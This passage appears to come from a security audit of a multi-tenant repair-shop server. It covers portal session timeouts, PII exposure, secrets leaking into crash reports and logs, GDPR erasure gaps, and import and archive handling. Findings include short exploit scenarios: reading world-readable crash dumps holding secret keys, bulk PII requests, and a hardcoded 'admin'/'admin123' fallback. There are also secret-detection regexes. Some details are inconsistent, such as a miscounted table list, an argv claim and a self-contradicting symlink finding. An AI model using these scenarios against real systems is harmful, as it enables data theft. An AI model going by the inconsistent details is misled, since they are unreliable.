const session = await adb.get<AnyRow>(
  `SELECT customer_id, scope, ticket_id, token
     FROM portal_sessions
    WHERE token = ? AND expires_at > datetime('now')`,  // only expiry, no idle
  token,
);
// portal.routes.ts:141 — correctly evicts idle sessions
if (lastUsedMs === null || Date.now() - lastUsedMs > IDLE_LIMIT_MS) {
  await adb.run('DELETE FROM portal_sessions WHERE token = ?', token);
  res.status(401).json({ ... message: 'Session idle timeout. Please log in again.' });
```

**Exploit:**
A customer logs in from a shared computer, the session goes idle for 5 hours (browser closed). v1 portal rejects the session cookie. The attacker reuses the cookie to hit `GET /portal/api/v2/ticket/42/timeline` which succeeds, leaking ticket history including SMS transcripts and diagnostic notes.

**Fix:**
Mirror the idle-timeout check from `portal.routes.ts` into `portal-enrich.routes.ts` `portalAuth`, including the `last_used_at` update on every accepted request. Or extract a shared `portalAuthMiddleware` helper used by both files.

---

### [LOW] GET /inbox/conversations exposes bulk customer phone numbers to any authenticated user

**Where:** `packages/server/src/routes/inbox.routes.ts:157`

**What:**
`GET /inbox/conversations` returns up to 500 rows each containing a normalized customer phone number (`phone` field), assigned user ID, and conversation tags. There is no role gate; any authenticated staff member can call this endpoint. The intent is to let staff filter conversations, but the `all` filter returns every assigned phone number across the entire tenant.

**Code:**
```typescript
router.get(
  '/conversations',
  asyncHandler(async (req, res) => {
    // No role check
    const sql = `
      SELECT ca.phone, ca.assigned_user_id, ca.assigned_at, ...
        FROM conversation_assignments ca
       LIMIT 500
    `;
    res.json({ success: true, data: enriched });
  }),
);
```

**Exploit:**
A technician with no SMS access permission calls `GET /api/v1/inbox/conversations?assigned_to=all` and receives up to 500 customer phone numbers along with their conversation assignment history.

**Fix:**
Add at minimum a manager/admin role check (or a new `sms.view` permission check) on the `assigned_to=all` and `assigned_to=unassigned` filter paths, scoping technicians to only their own assigned conversations (`assigned_to=me` implicitly).

---

### [LOW] GET /leads and GET /leads/pipeline expose phone and email to unassigned technicians

**Where:** `packages/server/src/routes/leads.routes.ts:110` (pipeline), `packages/server/src/routes/leads.routes.ts:169` (list)

**What:**
Both the kanban pipeline endpoint (`GET /leads/pipeline`) and the paginated list (`GET /leads`) execute `SELECT l.*` which includes `l.phone` and `l.email`. There is no role gate and no assignment scoping: any authenticated user receives phone numbers and emails for all leads in the system. Unlike tickets (which respect `ticket_all_employees_view_all` and per-assignment filtering), leads have no equivalent visibility control.

**Code:**
```typescript
// leads.routes.ts:209
const leads = await adb.all<any>(`
  SELECT l.*,
    u.first_name AS assigned_first_name, ...
  FROM leads l
  WHERE l.is_deleted = 0
  ORDER BY l.${safeSortBy} ${sortOrder}
  LIMIT ? OFFSET ?
`);  // No role scope, no assignment filter
```

**Exploit:**
A technician calls `GET /api/v1/leads?pagesize=200` and receives the full name, email, and phone number of every prospective customer (lead) in the system including those assigned to other staff.

**Fix:**
For non-admin/manager roles, add an `assigned_to = ?` filter to scope technicians to their own leads (or introduce a `leads.view_all` permission), mirroring the ticket visibility pattern in `search.routes.ts:64–67`.

---

### [INFO] GET /portal/verify accepts session token in query string (logged in access logs)

**Where:** `packages/server/src/routes/portal.routes.ts:1060`

**What:**
The deprecated `GET /portal/verify?token=<token>` endpoint is still active. When the query-string path is used (no `Authorization` header), the bearer token appears in server access logs, browser history, Referer headers, and any CDN/proxy request logs. The endpoint already logs a deprecation warning but remains functional.

**Code:**
```typescript
router.get('/verify', asyncHandler(async (req: PortalRequest, res: Response) => {
  const queryToken = req.query.token as string | undefined;
  const token = authHeader?.startsWith('Bearer ') ? authHeader.slice(7) : queryToken;
  // token from query string → appears in all HTTP logs
  await verifySessionHandler(req, res, token);
}));
```

**Exploit:**
A customer visits `https://shop.example.com/portal/verify?token=abc123`. The full URL (including session token) is recorded in web server logs accessible to any log reader. The token grants full portal access for up to 24 hours.

**Fix:**
Remove the GET `/verify` route entirely; the `POST /verify` variant (which accepts token from `Authorization` header or POST body) is already the preferred path and is documented as such. If backwards compatibility is required for one more release, at least add a `max-age=0, no-store` `Cache-Control` header to prevent the response (and referrer) being cached with the token.

---


---

# S24-logging

# S24 — Logging Secrets / Error Message Leakage / Request Logger PII

Scope: `packages/server/src/utils/logger.ts`, `packages/server/src/middleware/requestLogger.ts`, `packages/server/src/middleware/errorHandler.ts`, `packages/server/src/middleware/errorEnvelope.ts`, `packages/server/src/utils/errorCodes.ts`, `packages/server/src/services/crashTracker.ts`, `packages/server/src/middleware/crashResiliency.ts`, plus sampled routes.
Reviewed: 2026-05-05

---

### [HIGH] Node.js V8 diagnostic crash reports contain all `process.env` values (JWT secrets, Stripe keys, etc.) and are written world-readable

**Where:** `packages/server/src/index.ts:38-43`

**What:**
`process.report.reportOnFatalError = true` is enabled globally. Node.js diagnostic report JSON contains a full `environmentVariables` section that lists every `process.env` entry, including `JWT_SECRET`, `STRIPE_SECRET_KEY`, `CONFIG_ENCRYPTION_KEY`, `BACKUP_ENCRYPTION_KEY`, `SUPER_ADMIN_SECRET`, and every other sensitive env var. The directory is created with `fs.mkdirSync(crashReportDir, { recursive: true })` using no explicit `mode` argument; on a typical Linux server the default umask (022) yields `0755` on the directory and `0644` on files — both world-readable. No filtering or masking of the environment section is configured (`process.report.excludeEnvironment` is not set).

**Code:**
```typescript
const crashReportDir = path.resolve(__dirname, '../data/crash-reports');
if (!fs.existsSync(crashReportDir)) fs.mkdirSync(crashReportDir, { recursive: true });
process.report.reportOnFatalError = true;
process.report.directory = crashReportDir;
// No: process.report.excludeEnvironment = true;
// No: fs.mkdirSync(crashReportDir, { recursive: true, mode: 0o700 });
```

**Exploit:**
Any OS user on the host (not just root) can `cat /app/packages/server/data/crash-reports/*.json` after a native crash or SIGABRT and read all secret keys, enabling full JWT forgery, DB backup decryption, Stripe account access, and super-admin takeover.

**Fix:**
Set `process.report.excludeEnvironment = true` before enabling `reportOnFatalError`. Also create the directory with `mode: 0o700` (`fs.mkdirSync(crashReportDir, { recursive: true, mode: 0o700 })`). In Docker the single-user constraint makes this lower risk but the fix is still required for bare-metal deployments.

---

### [MEDIUM] `handleFatal()` logs `error.stack` unconditionally in production, bypassing the `LOG_INCLUDE_STACKS` gate

**Where:** `packages/server/src/index.ts:3874-3880`, `packages/server/src/index.ts:3863-3868`

**What:**
The code comments at line 3832–3836 state "In production, the stack field is emitted only when `LOG_INCLUDE_STACKS=true`", and `emitCrashLog()` (called at line 3885) correctly implements that gate. However, `handleFatal()` emits a first `log.error` call at lines 3874-3880 with `stack: error.stack` hardcoded in the meta bag — this call bypasses the guard entirely. The same unconditional pattern repeats in the re-entrant branch at lines 3863-3868. In production, the first structured log line for every fatal always includes the full stack trace regardless of `LOG_INCLUDE_STACKS`.

**Code:**
```typescript
// handleFatal — first log.error (line 3874):
log.error('FATAL: unrecoverable process error — initiating shutdown', {
  type,
  route,
  errorName: error.name,
  errorMessage: error.message,
  stack: error.stack,  // always included — bypasses INCLUDE_STACKS_IN_LOGS
});
// emitCrashLog respects the flag, but runs AFTER this unconditional log
```

**Exploit:**
Stack frames reference source file paths, tenant DB file names, and internal module structure. In a shared-log aggregation pipeline (ELK, Loki) where the stack field is indexed, an operator account compromise yields stack-based recon data even when the feature flag `LOG_INCLUDE_STACKS` is `false`.

**Fix:**
Apply the same `INCLUDE_STACKS_IN_LOGS` guard inside `handleFatal()` before populating the `stack` field:
```typescript
if (INCLUDE_STACKS_IN_LOGS && error.stack) meta.stack = error.stack;
```

---

### [MEDIUM] `crash-log.json` and `data/` directory created without restrictive permissions (world-readable on default Linux umask)

**Where:** `packages/server/src/services/crashTracker.ts:84-97`

**What:**
`saveCrashData()` uses `fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2))` with no `mode` option. `fs.mkdirSync(dir, { recursive: true })` also carries no `mode`. The default `umask` on most Linux servers is `022`, resulting in `crash-log.json` at permission `0644` (world-readable) and the `data/` directory at `0755`. `crash-log.json` stores `errorStack` strings for up to 500 crash entries; though `redactSecrets()` strips Bearers and JWTs, it misses secret formats such as Stripe live keys (`sk_live_…`) that are alphanumeric rather than hex-40 or JWT-shaped.

**Code:**
```typescript
const tmpPath = CRASH_LOG_PATH + '.tmp.' + process.pid + '.' + Date.now();
fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2));  // no mode: 0o600
fs.renameSync(tmpPath, CRASH_LOG_PATH);
```

**Exploit:**
A low-privileged OS user on the same host reads `crash-log.json` and extracts `errorStack` entries that contain Stripe or BlockChyp API key values that appear in error messages from those SDK clients.

**Fix:**
Pass `{ mode: 0o600 }` to `writeFileSync` and `{ recursive: true, mode: 0o700 }` to `mkdirSync`. Extend `redactSecrets()` to also strip Stripe/live-key-shaped strings (`/\bsk_(live|test)_[A-Za-z0-9]{24,}\b/g`).

---

### [MEDIUM] `redactSecrets()` in `crashTracker.ts` does not mask Stripe secret keys or short API keys in crash stack traces

**Where:** `packages/server/src/services/crashTracker.ts:152-166`

**What:**
`redactSecrets()` matches: Bearer tokens (≥8 chars alphanumeric+symbols), `Authorization:` headers, common query-param secrets (`api_key=`, `password=`), hex-40+ strings, JWT-shaped strings, and Twilio SIDs. It does **not** match Stripe live/test secret key format (`sk_live_…`, `sk_test_…`) which are 51-char alphanumeric strings, nor BlockChyp API keys which have a similar format. If a Stripe or payment SDK raises an exception that echoes the key (e.g., "Invalid API key: sk_live_XXXX"), the key survives into `crash-log.json` and is returned verbatim via `GET /api/v1/management/crashes`.

**Code:**
```typescript
function redactSecrets(text: string): string {
  return text
    .replace(/Bearer\s+[A-Za-z0-9._\-+/=]{8,}/gi, 'Bearer [REDACTED]')
    // ... no pattern for sk_live_* or sk_test_* Stripe keys
    .replace(/\b[A-Fa-f0-9]{40,}\b/g, '[REDACTED_HEX]')
    // Stripe keys are NOT hex-only (contains g-z), so hex pattern misses them
```

**Exploit:**
An SDK raises `StripeAuthenticationError: No such payment method: sk_live_<REDACTED-EXAMPLE-KEY>`. The error message survives into `crash-log.json`. A super admin opening the Management dashboard Crash Log panel sees the live Stripe key.

**Fix:**
Add to `redactSecrets()`:
```typescript
.replace(/\bsk_(live|test)_[A-Za-z0-9]{24,}\b/g, 'sk_$1_[REDACTED]')
.replace(/\brk_(live|test)_[A-Za-z0-9]{24,}\b/g, 'rk_$1_[REDACTED]')
```
And apply equivalent patterns for other payment provider key formats used (BlockChyp, etc.).

---

### [LOW] `SENSITIVE_HEADER_NAMES` defined in `requestLogger.ts` is dead code — comment incorrectly claims headers are scrubbed before logging

**Where:** `packages/server/src/middleware/requestLogger.ts:54-56`, `packages/server/src/middleware/requestLogger.ts:156`

**What:**
A `SENSITIVE_HEADER_NAMES` set is declared at line 54 (`authorization`, `cookie`, `set-cookie`, `x-csrf-token`, `x-api-key`, `proxy-authorization`) with an `@audit-fixed` comment claiming "Applied to query strings **and headers** before they touch the structured log." However, the `meta` object logged on response finish (lines 123-133) does not include any request headers at all — only `method`, `path`, `status`, `duration_ms`, `ip`, `userAgent`, `contentLength`, `userId`, `tenantSlug`. The set is only referenced as `void SENSITIVE_HEADER_NAMES` (line 156) to suppress the lint "unused variable" warning. No header scrubbing actually occurs. While headers are currently not logged, the misleading comment creates false assurance that future developers adding header logging will be protected.

**Code:**
```typescript
const SENSITIVE_HEADER_NAMES = new Set([
  'authorization', 'cookie', 'set-cookie', 'x-csrf-token', 'x-api-key', 'proxy-authorization',
]);
// ...
void SENSITIVE_HEADER_NAMES;  // only reference — no scrubbing applied
```

**Exploit:**
A developer adds `headers: req.headers` to the meta object expecting the set to scrub secrets automatically. Authorization tokens, cookies, and API keys are logged to stdout and ingested by the log aggregator, exposing live user sessions.

**Fix:**
Either implement the header-scrubbing function using `SENSITIVE_HEADER_NAMES` and export it so it is applied when headers are needed, or remove the set and clarify the comment: "Headers are deliberately not logged; add them here only after applying explicit scrubbing."

---

### [LOW] PII masking in `logger.ts` is production-only; dev/staging logs emit full emails, phone numbers, and addresses in plaintext

**Where:** `packages/server/src/utils/logger.ts:88-91`

**What:**
`buildEntry()` sets `shouldMask = isProd && level !== 'debug' && meta && Object.keys(meta).length > 0`. Non-production environments (staging, developer laptops, CI) receive zero masking. In practice, `signup.routes.ts` logs `{ email: normalizedEmail }` at `warn` and `info` levels (lines 620, 673, 713), and cron tasks log SMS recipient phones (index.ts line 2879, 3191, etc.) without redaction in any non-prod environment. Staging databases often contain real customer data from production imports; staging logs would expose this data in plaintext.

**Code:**
```typescript
const isProd = process.env.NODE_ENV === 'production';
const shouldMask = isProd && level !== 'debug' && meta && Object.keys(meta).length > 0;
const safeMeta = shouldMask ? redactMetaForProduction(meta!) : meta;
```

**Exploit:**
Staging environment uses a copy of production customer data. A developer shares a log snippet in a Slack channel to debug an SMS delivery issue; the snippet contains real phone numbers since masking only activates in `NODE_ENV=production`.

**Fix:**
Enable PII masking for all non-debug log levels regardless of `NODE_ENV`. Restrict full plaintext PII to `debug` level only (which is already excluded from the mask). Replace the `isProd` guard with `level !== 'debug'`.

---

### [LOW] `redactMetaValue()` in `logger.ts` does not mask email addresses passed under key `'to'` or `'from'`

**Where:** `packages/server/src/utils/logger.ts:72-74`

**What:**
`redactMetaValue()` branches on key `'to'` and `'from'` into the phone-masking path: `PII_PATTERNS.phoneDigits.test(value) ? maskPhone(value) : value`. If the value is an email address (`user@example.com`), the phone regex fails and the raw email is returned unmasked. For telephony contexts this is correct, but SMTP-sending code that logs `{ to: '<email>' }` would bypass masking. The `PII_KEY_HINTS` array (line 46) lists `'to'` and `'from'` as PII hints but is never used in any logic — it is dead code.

**Code:**
```typescript
if (k.includes('phone') || k === 'to' || k === 'from' || k === 'mobile') {
  return PII_PATTERNS.phoneDigits.test(value) ? maskPhone(value) : value;
  // 'user@example.com' fails phoneDigits test → returned unmasked
}
```

**Exploit:**
An email service is updated to log `{ to: recipientEmail, subject: '...' }` on send failure. In production, the logger's `redactMetaValue` sees key `'to'`, tries the phone pattern, fails, returns the email address verbatim to the log aggregator.

**Fix:**
Add a fallback email check in the `'to'`/`'from'` branch: if `phoneDigits` test fails but `email` regex matches, apply `maskEmail` instead:
```typescript
if (PII_PATTERNS.phoneDigits.test(value)) return maskPhone(value);
if (PII_PATTERNS.email.test(value)) return maskEmail(value);
return value;
```

---

### [INFO] `resetDisabledRoutesOnStartup()` prints `lastError` (post-redaction) to `console.log`, bypassing structured logger

**Where:** `packages/server/src/services/crashTracker.ts:287`

**What:**
On server startup, `resetDisabledRoutesOnStartup()` iterates previously disabled routes and logs `lastError: ${r.lastError}` via `console.log`. While `lastError` is stored after `redactSecrets()` processing, the output goes through `console.log` rather than the structured logger. In production `index.ts` suppresses `console.log` lines that don't start with `[` (line 9-13), so messages starting with `[CrashTracker]` are preserved. These messages are not JSON-structured, making them harder for log aggregators to parse and potentially causing them to skip the secret-redaction pipeline of downstream processors.

**Code:**
```typescript
console.log(`  - ${r.route} (was disabled at ${r.disabledAt}, lastError: ${r.lastError})`);
```

**Fix:**
Replace with the structured logger: `log.info('startup: cleared disabled route', { route: r.route, disabledAt: r.disabledAt, lastError: r.lastError })`. Import `createLogger('crashTracker')` at the module level.

---

### [INFO] Signup route logs full admin email in plaintext at `warn` level under key `email` — masked in production but exposed in staging

**Where:** `packages/server/src/routes/signup.routes.ts:620`

**What:**
The temporary `TEMP-NO-EMAIL-VERIF` path (currently hardcoded `true` and therefore always active) logs `{ email: normalizedEmail }` at `warn` level. In production this is masked by `redactMetaForProduction` to `***@domain`. However since the `skipEmailVerification = true` constant is hardcoded (not env-gated), this path is also active in production — meaning every tenant signup logs an obfuscated but still domain-revealing email. More critically, in any non-production environment (staging, dev) the email is logged in full.

**Code:**
```typescript
const skipEmailVerification = true;
if (skipEmailVerification) {
  logger.warn('signup: TEMP-NO-EMAIL-VERIF — email verification disabled', { slug: normalizedSlug, email: normalizedEmail });
```

**Fix:**
The hardcoded `skipEmailVerification = true` is a separate security concern (tracked in signup audit). For logging: remove the `email` field from the warn message or replace it with a hash: `emailHash: crypto.createHash('sha256').update(normalizedEmail).digest('hex').slice(0, 8)`.

---

## Summary

| Severity | Count |
|----------|-------|
| HIGH     | 1     |
| MEDIUM   | 3     |
| LOW      | 3     |
| INFO     | 2     |

**Strongest positives:** `errorHandler.ts` correctly withholds stack traces from all client responses. `requestLogger.ts` scrubs sensitive query params via `scrubPath()`. `crashTracker.ts` applies `redactSecrets()` before persisting. Phone numbers in cron tasks use `redactPhone()` throughout. `handleFatal` calls `emitCrashLog` which respects `LOG_INCLUDE_STACKS`.

**Most significant gap:** Node.js V8 crash reports (`process.report`) will contain all `process.env` secrets and are written to a world-readable directory — this is the highest-risk finding because it silently dumps every secret key in plaintext during native crashes.


---

# S25-retention

# S25 — Data Retention / Hard-Delete / GDPR Right-to-Erasure

---

### HIGH: GDPR erase blocked by FK constraint — partial erasure leaves customer row intact

**Where:** `packages/server/src/routes/customers.routes.ts:2206` (hard DELETE), cross-referenced migrations `025`, `026`, `041`, `068`, `123`

**What:**
The `DELETE /:id/gdpr-erase` handler calls `DELETE FROM customers WHERE id = ?` after clearing
tickets/invoices/estimates/sms/call/email rows, but six tables with NOT-NULL foreign keys to
`customers(id)` and **no** `ON DELETE CASCADE` are never cleared first:
`customer_feedback` (mig. 025), `store_credits` (mig. 026), `store_credit_transactions` (mig. 026),
`customer_subscriptions` (mig. 068), `portal_sessions` (mig. 041),
`portal_verification_codes` (mig. 041), and `invoice_templates` (mig. 123).
With `PRAGMA foreign_keys = ON` (confirmed in `tenant-pool.ts:84`), SQLite raises
`FOREIGN KEY constraint failed` and the customer row is never deleted.
There is no transaction wrapping the handler, so all prior DELETEs
(`sms_messages`, `call_logs`, `email_messages`, etc.) have already committed when the error fires.

**Code:**
```typescript
// customers.routes.ts ~2183 — phone set built BEFORE FK tables are cleared
await adb.run(`DELETE FROM sms_messages WHERE conv_phone IN (...)`, ...phoneList);
await adb.run(`DELETE FROM call_logs WHERE conv_phone IN (...)`, ...phoneList);
// ...
await adb.run('DELETE FROM customers WHERE id = ?', id);  // line 2206
// ↑ throws FK constraint if customer has feedback/credits/subscriptions/portal rows
// No transaction — prior deletes already committed. Customer row survives.
```

**Exploit:**
Any customer who has a store-credit balance, a membership subscription, a portal session, or
feedback rows will permanently defeat their own GDPR erasure request: communications data is
destroyed but the identifying customer record persists, violating Art. 17 GDPR.  Compliance
audit trails show `customer_gdpr_erased` never fires for these customers.

**Fix:**
Wrap the entire handler in a `db.transaction(...)` (better-sqlite3 synchronous transaction or
`adb.transaction([...])` batched form). Before the final `DELETE FROM customers`, add explicit
`DELETE FROM customer_feedback`, `store_credits`, `store_credit_transactions`,
`customer_subscriptions`, `portal_sessions`, `portal_verification_codes`, and
`invoice_templates` WHERE `customer_id = ?`.

---

### MEDIUM: GDPR erase skips SMS/call logs from extra phone numbers

**Where:** `packages/server/src/routes/customers.routes.ts:2185–2193`

**What:**
The erasure builds `phoneSet` from only `customer.phone` and `customer.mobile` (the two columns on the
`customers` row itself). It never queries the `customer_phones` table (where additional contact
numbers are stored after POST/PUT operations).  SMS and call-log rows keyed on those extra
`conv_phone` values are never deleted.

**Code:**
```typescript
const phoneSet = new Set<string>();
if (customer.phone)  phoneSet.add(normalizePhone(customer.phone));
if (customer.mobile) phoneSet.add(normalizePhone(customer.mobile));
// customer_phones table is NOT consulted — extra numbers survive erasure
if (phoneSet.size > 0) {
  await adb.run(`DELETE FROM sms_messages WHERE conv_phone IN (...)`, ...phoneList);
  await adb.run(`DELETE FROM call_logs   WHERE conv_phone IN (...)`, ...phoneList);
}
```

**Exploit:**
A customer whose primary contact was changed (old number now in `customer_phones`) retains all
historical SMS/call PII under their old number after the erasure returns HTTP 200 success.

**Fix:**
Before building `phoneSet`, query `SELECT phone FROM customer_phones WHERE customer_id = ?`
and union those numbers into the set — mirroring the pattern already used in `GET /:id/export`
(line ~1944) and `GET /:id/communications` (line ~1688).

---

### HIGH: Tenant termination never removes the uploads directory

**Where:** `packages/server/src/services/tenantTermination.ts:280–423` (executeTermination + purgeExpiredDeletions)

**What:**
`executeTermination` renames the tenant DB into `deleted/` and removes the Cloudflare DNS record
but makes no attempt to clean up `<config.uploadsPath>/<tenantSlug>/`.
`purgeExpiredDeletions` (called after the 30-day grace period) only `unlinkSync`s the `.db`,
`-wal`, and `-shm` files; the uploads directory remains on disk indefinitely after the DB is purged.
This includes ticket photos, customer-signature data URLs written to disk, export archives, and any
other binary uploads the tenant created during their lifetime.

**Code:**
```typescript
// purgeExpiredDeletions — tenantTermination.ts ~490
fs.unlinkSync(full);
try { fs.unlinkSync(full + '-wal'); } catch {}
try { fs.unlinkSync(full + '-shm'); } catch {}
purged += 1;
// No cleanup of uploadsPath/<slug>/ or exportsDir/<slug>/
```

**Exploit:**
After a tenant self-terminates and the 30-day grace elapses, all uploaded files remain readable at
their original filesystem path.  Any process or user with filesystem access (backup scripts,
rogue employees, compromised server) can read former-tenant PII from on-disk photos and signatures
indefinitely — a GDPR Art. 17 / Art. 5(1)(e) storage-limitation violation.

**Fix:**
In `purgeExpiredDeletions`, after unlinking the DB files, also `fs.rmSync(uploadsPath/<slug>/, { recursive: true, force: true })`.
Store the `<tenantSlug>` in the `tenants` table's `archived_db_path` (or a new column) so the slug
is available without parsing the filename.  Mirror the same cleanup in `executeTermination`'s
immediate rename path (at least move / archive the uploads folder alongside the DB).

---

### MEDIUM: Tenant export files orphaned after termination — never swept

**Where:** `packages/server/src/services/tenantExport.ts:718` (`sweepOldExports`), `packages/server/src/services/retentionSweeper.ts:596–614`

**What:**
`sweepOldExports` is called by `runRetentionSweep`, which is called nightly by the `forEachDbAsync`
cron loop against every **active** tenant DB.  Once a tenant is terminated, `closeTenantDb` is
called and the DB file is renamed into `deleted/`; the terminated DB is therefore never iterated
again by `forEachDbAsync`.  Any `.enc` export files written to `<exportsDir>/` before termination
are never removed by the sweep (the DB row that tracks them is inside the now-inaccessible tenant
DB), so they persist on disk past the 7-day retention window indefinitely.

**Code:**
```typescript
// sweepOldExports: called only via runRetentionSweep(tenantDb, ...) per-active-tenant
const expired = db.prepare(
  `SELECT id, file_path FROM tenant_exports
   WHERE started_at < datetime('now', '-${EXPORT_RETENTION_DAYS} days')`
).all();
// After termination, db handle is closed — this query never runs for that tenant again.
```

**Exploit:**
An exported tenant backup (AES-256-GCM encrypted but containing all PII) may remain on-disk weeks
or months after the tenant's DB is purged.  If the exports directory is ever compromised, the
attacker has a complete data snapshot even though the tenant believed their data was deleted.

**Fix:**
During `executeTermination`, enumerate all `.enc` files in `<exportsDir>/` matching the tenant
slug prefix and delete them immediately (before or alongside the DB rename).  Alternatively,
maintain a separate `master_tenant_exports` log in the master DB for post-termination sweep.

---

### LOW: Pre-migration-108 tenants: PII retention silently disabled despite master switch

**Where:** `packages/server/src/services/retentionSweeper.ts:139`, `packages/server/src/db/migrations/108_pii_retention_defaults.sql`

**What:**
`DEFAULT_PII_MONTHS = 0` is the fallback when a tenant's `store_config` row for
`retention_sms_months` / `retention_calls_months` / `retention_email_months` /
`retention_ticket_notes_months` is missing.  Migration 108 seeds those keys at `24` via
`INSERT OR IGNORE`, but tenants that pre-date migration 108 and never had the migration applied
(or had the rows deleted) will fall through to `0` (disabled) even after enabling the
`retention_sweep_enabled` master switch.  The inline comment on `readPiiRetentionMonths` says
"falling back to the 24mo default", contradicting the actual code.

**Code:**
```typescript
const DEFAULT_PII_MONTHS = 0;           // line 139 — "disabled" sentinel
// readPiiRetentionMonths (line 354):
const parsed = row?.value !== undefined ? Number.parseInt(row.value, 10) : NaN;
if (!Number.isFinite(parsed) || parsed < MIN_PII_MONTHS) {
  return DEFAULT_PII_MONTHS;   // returns 0 → PII sweep skipped silently
}
```

**Exploit:**
A tenant admin enabling `retention_sweep_enabled = '1'` believes PII is being swept per their
privacy policy.  For pre-108 tenants with missing config keys, the sweep silently does nothing for
all four PII tables, constituting a quiet compliance failure with no operator-visible warning.

**Fix:**
Change `DEFAULT_PII_MONTHS` from `0` to `24` (or whatever the policy default is), and add a
log-level warning whenever `readPiiRetentionMonths` has to use the hardcoded fallback so operators
can detect missing config keys.  Alternatively, make the migration runner idempotent and re-seed
missing keys during every startup rather than relying on `INSERT OR IGNORE`.

---

### LOW: Customer notes hard-delete has no audit log

**Where:** `packages/server/src/routes/customers.routes.ts:2470–2472`

**What:**
`DELETE /:id/notes/:noteId` permanently removes a customer note without writing any `audit_logs`
entry.  Any user with the `customers.edit` permission can silently destroy the CRM note history
for any customer.  Contrast with `GET /:id/export` which writes an audit row, and
ticket-note deletes which write a `ticket_history` entry.

**Code:**
```typescript
await adb.run('DELETE FROM customer_notes WHERE id = ?', noteId);
// No audit() call — the deletion is untracked
res.json({ success: true, data: null });
```

**Exploit:**
A rogue employee (e.g. about to be terminated) deletes damaging notes about their own misconduct
from a customer file; there is no forensic record that the note ever existed.

**Fix:**
Add `audit(req.db, 'customer_note_deleted', req.user!.id, req.ip || 'unknown', { customer_id: customerId, note_id: noteId })` before the `DELETE`.

---

### LOW: Soft-deleted (or GDPR-erased) customers readable via CRM health-score endpoints

**Where:** `packages/server/src/routes/crm.routes.ts:141`, `crm.routes.ts:208`

**What:**
`GET /customers/:id/health-score` and `GET /customers/:id/ltv-tier` query `customers` without an
`AND is_deleted = 0` guard.  A soft-deleted customer (or one where the customer row survived a
failed GDPR erasure, per Finding 1 above) can be read by any manager or admin.  The endpoints
return health score, LTV tier, and lifetime-value-cents — metadata derived from PII the operator
may believe has been erased.

**Code:**
```typescript
// crm.routes.ts:141
const row = await adb.get<...>(
  `SELECT health_score, health_tier, last_interaction_at, lifetime_value_cents
     FROM customers WHERE id = ?`,   // no is_deleted = 0 filter
  id,
);
```

**Exploit:**
After a customer deletion request, a manager queries the health-score endpoint with the known
customer ID and retrieves their calculated lifetime value and interaction timestamp, revealing
retained PII that was supposed to be inaccessible.

**Fix:**
Add `AND is_deleted = 0` (or `AND is_deleted = 0 AND id IS NOT NULL` for hard-deleted rows) to
both SELECT statements. For customers hard-deleted via gdpr-erase, also confirm the row is gone
before returning data.

---


---

# S26-zip-slip

# S26 — Zip-slip / Tar-slip / CSV formula injection in archive + import flows

## Scope investigated

- `packages/server/src/services/myRepairAppImport.ts` (read fully)
- `packages/server/src/services/repairDeskImport.ts` (read fully)
- `packages/server/src/services/repairShoprImport.ts` (read fully)
- `packages/server/src/services/receiptOcr.ts` (read fully)
- `packages/server/src/scripts/full-import.ts` (read fully)
- `packages/server/src/services/dataExportGenerator.ts` (read fully)
- `packages/server/src/services/backup.ts` (read fully)
- `packages/server/src/services/tenantExport.ts` (read fully)
- `packages/server/src/services/tenantTermination.ts` (read fully)
- `packages/server/src/routes/tickets.routes.ts` (CSV export section)
- `packages/server/src/routes/inventory.routes.ts` (CSV import + export section)
- `packages/server/src/routes/customers.routes.ts` (CSV import section)
- `packages/server/src/routes/reports.routes.ts` (CSV export section)
- `packages/server/src/routes/team.routes.ts` (payroll CSV export section)
- Grep for: `unzipper`, `adm-zip`, `yauzl`, `tar.x`, `csv-parse`, `papaparse`, `extractAllTo`, `isSymbolicLink`, ZIP-related patterns

---

### [MEDIUM] `full-import.ts` script falls back to hardcoded credentials `admin`/`admin123`

**Where:** `packages/server/src/scripts/full-import.ts:33`

**What:**
The operator-run bulk-import script calls `login()` and falls back to the literal default credentials `admin`/`admin123` when the environment variables `ADMIN_USERNAME` and `ADMIN_PASSWORD` are not set. Because the script must be run with a running server, this means running it without setting those env vars will silently authenticate as `admin`:`admin123` — the same default password that `index.ts` explicitly warns is dangerous. If an operator follows copy-paste docs and the server is still running with the default password, the script succeeds and the credentials appear in shell history.

**Code:**
```typescript
// packages/server/src/scripts/full-import.ts:29-36
async function login(): Promise<string> {
  const resp = await fetch(`${SERVER_URL}/api/v1/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: process.env.ADMIN_USERNAME || 'admin',
      password: process.env.ADMIN_PASSWORD || 'admin123',  // ← hardcoded fallback
    }),
  });
```

**Exploit:**
An operator running `npx tsx src/scripts/full-import.ts` without setting `ADMIN_PASSWORD` (e.g., on a dev box that still uses the default password) will silently authenticate with the insecure default. The plaintext default password also appears in `ps aux` output on Linux since Node passes `argv` values. This is a low-bar entry point if the server is accidentally exposed.

**Fix:**
Remove both fallbacks. If either env var is missing, print an error and `process.exit(1)`. Add a `/* required */` comment: `const username = process.env.ADMIN_USERNAME; if (!username) { console.error('ADMIN_USERNAME required'); process.exit(1); }`.

---

### [MEDIUM] `tenantExport.collectUploads` does not filter symlinks — symlink targets outside uploads root are silently included

**Where:** `packages/server/src/services/tenantExport.ts:576-615`

**What:**
`collectUploads` iterates the uploads directory with `withFileTypes: true` and branches on `entry.isDirectory()` / `entry.isFile()`. These two predicates are based on `lstat`, so a symlink to a file returns `isFile() = false` and `isDirectory() = false`, meaning it is silently skipped — this is actually safe for the ZIP contents. **However**, on the branch at line 600–601, the function recursively calls `collectUploads(absPath, resolvedBase, ...)` for any entry where `isDirectory()` is true. On Linux, a symlink to a directory passes `isDirectory()` as `false` (lstat-based), but `path.resolve(dir, entry.name)` still resolves to the symlink path. When the recursive call does `fsp.readdir(absPath, { withFileTypes: true })` on a directory symlink, `readdir` follows the symlink and returns the target's contents — those entries' resolved absolute paths may be outside `resolvedBase`, but the ZIP-slip guard checks against the parent `resolvedBase` using `absPath.startsWith(resolvedBase + path.sep)`. If the symlink target directory itself contains files, their `absPath = path.resolve(absPath_of_symlink, entry.name)` may not start with `resolvedBase + sep`, so those are correctly rejected. **The actual risk is:** `entry.isDirectory()` for a symlink-to-directory returns `false` under `withFileTypes` (uses `lstat`), so the recursive branch is never taken for directory symlinks. The `isFile()` branch at line 603 returns `false` for a symlink-to-file, so those are skipped too. In practice no symlink content reaches the ZIP. However, this relies on undocumented/implicit behavior. The code contains no explicit 